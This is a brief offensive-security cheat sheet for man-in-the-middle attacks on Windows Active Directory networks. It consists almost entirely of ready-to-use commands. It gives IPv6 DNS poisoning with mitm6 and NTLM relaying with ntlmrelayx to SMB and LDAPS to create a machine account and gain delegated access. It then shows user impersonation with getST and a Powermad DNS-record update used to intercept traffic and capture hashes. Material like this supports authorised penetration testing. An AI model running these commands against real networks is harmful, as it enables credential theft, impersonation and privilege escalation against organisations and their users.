# MitM

### Ipv6 DNS Takeover & Relay

```bash
# give yourself any ipv6 address
ip -6 addr add fe80::13:37/10 dev <iface>
# poison single host
mitm6 -hw <host> -d <domain> --ignore-nofqdn
# poison whole network
mitm6 -d <net>
# relay to smb in order to open a socks connection
ntlmrelayx.py -6 -wh <net> -t smb://<ip> -l ~/tmp/ -socks -debug
# relay to dlap in order to create a new machine account, which gives us local system on the poisoned box
ntlmrelayx.py -t ldaps://<dc>.<domain> -wh attacker-wpad --delegate-access
# impersonate user on overtaken machine account
getST.py -spn cifs/<original computer acc>.<domain>/<new computer acc> -impersonate <user>
```

### Update DNS record

Update DNS record to intercept traffic, capture hashes:

```bash
# https://github.com/Kevin-Robertson/Powermad
$user = '<user>'
$pass = ConvertTo-SecureString -AsPlainText '<pass>' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
invoke-dnsupdate -credential $cred -dnsname <dns entry> -dnsdata <lhost>
```

